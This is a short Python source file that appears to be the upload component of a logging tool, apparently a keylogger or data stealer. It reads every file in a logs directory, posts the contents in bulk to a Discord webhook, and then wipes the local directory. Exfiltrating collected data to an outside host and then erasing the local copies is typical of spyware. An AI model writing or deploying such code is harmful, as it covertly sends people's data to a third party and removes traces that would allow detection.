import requests
import time
import os
from config.config import (
    LOGS_DIRECTORY,
    WEBHOOK_URL,
    WEBHOOK_AVATAR_URL,
    WEBHOOK_USERNAME,
)
from utils.file_utils import clear_files_in_directory


def send_message(message):
    data = {
        "content": message,
        "username": WEBHOOK_USERNAME,
        "avatar_url": WEBHOOK_AVATAR_URL,
    }
    requests.post(WEBHOOK_URL, data)


def send_error(error):
    data = {
        "content": f"An error occured while logging: {error}",
        "username": WEBHOOK_USERNAME,
        "avatar_url": WEBHOOK_AVATAR_URL,
    }
    requests.post(WEBHOOK_URL, data)


def send_data(directory):
    send_message(f"SENDING DATA FROM {directory}...")

    if not os.path.exists(directory):
        send_error(f"Directory {directory} does not exist.")
        return

    files_dict = {
        "content": f"DATA IN {directory}:",
        "avatar_url": WEBHOOK_AVATAR_URL,
        "username": WEBHOOK_USERNAME,
    }
    files = os.listdir(directory)

    for file_name in files:
        file_path = os.path.join(directory, file_name)
        if os.path.isfile(file_path):
            try:
                with open(file_path, "rb") as file:
                    files_dict[file_name] = file.read()
            except Exception as e:
                send_error(f"Error occurred while reading file '{file_name}': {e}")

    # Send all files at once
    try:
        response = requests.post(WEBHOOK_URL, files=files_dict)
        if response.status_code == 200:
            print("All files sent successfully to Discord!")
        else:
            send_error(
                f"Failed to send files to Discord. Status code: {response.status_code}"
            )
    except Exception as e:
        send_error(f"Error occurred while sending files to Discord: {e}")

    try:
        print(f"Clearing {directory}...")
        clear_files_in_directory(directory)
    except Exception as e:
        print(f"An error occured while clearing {directory}: ", e)
        send_error(e)
